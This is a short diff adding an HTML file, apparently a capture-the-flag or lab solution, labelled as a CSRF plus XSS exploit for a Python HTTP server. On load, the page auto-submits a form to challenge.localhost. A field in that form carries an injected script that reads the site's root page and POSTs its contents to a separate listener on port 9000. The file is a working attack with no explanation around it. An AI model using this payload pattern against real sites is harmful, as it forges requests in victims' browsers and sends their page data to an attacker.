@@ -1,0 +1,16 @@
+<!--CSRF + XSS exploit for python http server-->
+<!DOCTYPE html>
+<html>
+<head>
+<title>Redirection</title>
+</head>
+<script>
+	window.onload = ()=>{document.getElementById("myForm").submit(); }
+</script>
+<body>
+Hello
+<form action="http://challenge.localhost:80/ephemeral" name="myForm" id="myForm" method="Get">
+<input type=text name=msg value="<script> fetch('/').then(res=>{return res.text()}).then(res=>{fetch('http://challenge.localhost:9000',{method:'post', body: res})}).then()</script>">
+</form>
+</body>
+</html>
